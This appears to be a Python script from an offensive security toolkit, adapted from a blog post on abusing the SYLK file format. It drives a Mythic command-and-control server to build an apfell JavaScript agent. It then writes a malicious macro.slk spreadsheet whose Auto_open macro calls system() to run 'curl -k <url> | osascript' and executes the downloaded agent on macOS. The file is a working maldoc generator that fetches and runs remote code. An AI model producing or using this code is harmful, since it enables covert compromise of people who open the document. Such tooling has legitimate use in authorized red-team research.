# Adapted from https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/

import asyncio
from pathlib import Path
from .Utilities import *


def sylk_macros_excel():
    payload = "./Payloads/MacroSYLKExcel_Payload"
    # url = mythic_payload_url + "/Excel_SYLK_Macro.js"   # Used for where the JXA paylaod is hosted

    # os.mkdir(payload,0o775)
    Path(payload).mkdir(parents=True, exist_ok=True)

    ## Create apfell payload
    async def scripting():
        # sample login
        print("[+] Logging into Mythic")
        mythic_instance = await login_mythic()
        print("[+] Creating new apfell payload")
        # define what our payload should be
        resp = await create_apfell_payload(mythic_instance=mythic_instance,
                                           description="SYLK Excel Macro",
                                           filename="Excel_SYLK_Macro.js",
                                           include_all_commands=True)
        if resp["build_phase"] == "success":
            payload_info = await get_payload_data(mythic_instance=mythic_instance, payload_uuid=resp["uuid"])
            url = await get_payload_download_url(payload_info)
            payload_contents = await mythic.download_payload(mythic=mythic_instance, payload_uuid=resp["uuid"])
            pkg_payload = payload + "/Excel_SYLK_Macro.js"
            with open(pkg_payload, "wb") as f:
                f.write(payload_contents)
            macrofile = open(payload + '/macro.slk', 'w')
            macrofile.write('ID;P\n')
            macrofile.write('O;E\n')
            macrofile.write('NN;NAuto_open;ER101C1;KD00mFist;F')
            macrofile.write("\n")
            macrofile.write(
                'C;X1;Y101;K0;ECALL(\"libc.dylib\",\"system\",\"JC\",\"/usr/bin/curl -k %s | osascript -l JavaScript &\")' % url)
            macrofile.write("\n")
            macrofile.write("C;X1;Y102;K0;EHALT()")
            macrofile.write("\n")
            macrofile.write("E")

            print("[+] Created the SYLK macro file macro.slk")
        else:
            print(f"[-] Failed to build payload:  {resp['build_stderr']}\n{resp['build_message']}")

    async def main():
        await scripting()

    asyncio.run(main())
